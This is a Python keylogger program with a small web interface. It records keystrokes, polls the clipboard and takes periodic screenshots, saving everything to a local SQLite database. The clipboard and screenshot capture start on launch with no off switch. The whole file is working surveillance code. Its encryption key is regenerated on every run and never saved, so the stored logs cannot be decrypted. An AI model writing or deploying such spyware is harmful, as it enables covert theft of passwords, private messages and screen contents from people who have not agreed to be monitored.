import eel
from pynput import keyboard
import sqlite3
from datetime import datetime
import threading
import os
import base64
from cryptography.fernet import Fernet
import pyperclip
import pyautogui
import time

# Initialize Eel
eel.init("web")

# Global control
is_logging = False
key_listener = None

# Encryption key (store securely in production)
fernet_key = Fernet.generate_key()
cipher = Fernet(fernet_key)

# Database setup
def setup_database():
    conn = sqlite3.connect('keystrokes.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_pressed TEXT,
            timestamp DATETIME
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clipboard (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            content TEXT,
            timestamp DATETIME
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            image BLOB,
            timestamp DATETIME
        )
    ''')
    conn.commit()
    conn.close()

setup_database()

# Clipboard logger
def log_clipboard():
    time.sleep(5)  # Delay to ensure stability
    previous_clipboard = ""
    while True:
        try:
            current = pyperclip.paste()
            if current != previous_clipboard:
                encrypted = cipher.encrypt(current.encode())
                conn = sqlite3.connect('keystrokes.db')
                cursor = conn.cursor()
                cursor.execute("INSERT INTO clipboard (content, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
                conn.commit()
                conn.close()
                previous_clipboard = current
        except Exception as e:
            print(f"Clipboard error: {e}")
        time.sleep(10)

# Screenshot capture
def periodic_screenshot():
    time.sleep(5)  # Delay to ensure UI loads
    while True:
        try:
            screenshot = pyautogui.screenshot()
            buffer = screenshot.tobytes()
            encoded_image = base64.b64encode(buffer)
            conn = sqlite3.connect('keystrokes.db')
            cursor = conn.cursor()
            cursor.execute("INSERT INTO screenshots (image, timestamp) VALUES (?, ?)", (encoded_image, datetime.now()))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Screenshot error: {e}")
        time.sleep(60)

# Key press handler
def on_press(key):
    global is_logging
    if is_logging:
        try:
            keystroke = key.char
        except AttributeError:
            keystroke = str(key)
        try:
            encrypted = cipher.encrypt(keystroke.encode())
            conn = sqlite3.connect('keystrokes.db')
            cursor = conn.cursor()
            cursor.execute("INSERT INTO keystrokes (key_pressed, timestamp) VALUES (?, ?)", (encrypted, datetime.now()))
            conn.commit()
            conn.close()
            print(f"Key logged: {keystroke}")
        except Exception as e:
            print(f"Key logging error: {e}")

# Start keylogging
@eel.expose
def start_logging():
    global is_logging, key_listener
    if not is_logging:
        is_logging = True
        key_listener = keyboard.Listener(on_press=on_press)
        key_listener.start()
        print("Keylogger started")
        return "Keylogger started."
    return "Keylogger already running."

# Stop keylogging
@eel.expose
def stop_logging():
    global is_logging, key_listener
    is_logging = False
    if key_listener is not None:
        key_listener.stop()
        key_listener = None
        print("Keylogger stopped")
        return "Keylogger stopped."
    return "Keylogger was not running."

# Start background threads
threading.Thread(target=log_clipboard, daemon=True).start()
threading.Thread(target=periodic_screenshot, daemon=True).start()

# Launch Eel UI
eel.start("index.html", mode='chrome', port=8000, block=False)

# Keep running
while True:
    time.sleep(1)
